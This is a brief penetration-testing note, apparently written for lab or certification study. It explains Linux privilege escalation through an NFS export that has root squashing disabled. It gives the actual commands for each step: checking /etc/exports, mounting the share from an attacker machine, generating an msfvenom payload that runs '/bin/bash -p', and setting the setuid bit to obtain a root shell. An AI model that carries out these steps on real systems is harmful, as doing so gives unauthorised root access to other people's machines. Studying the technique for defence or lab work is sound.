Network FIle System(NFS)

file created by NFS inherit the user id, if root squashing disabled. If enabled, file created would have a "nobody" user.

Check root squashing in
```bash
cat /etc/exports
```

as root in attacker machine create a mount point and mount the folder where root squashing is disabled
```bash
mkdir /tmp/nfs  
mount -o rw,vers=2 10.10.10.10:/tmp /tmp/nfs
```
generate a payload that create a root privileged shell in the mounted folder
```bash
`msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf`
chmod +xs /tmp/nfs/shell.elf
```
Run the executable to get root shell.
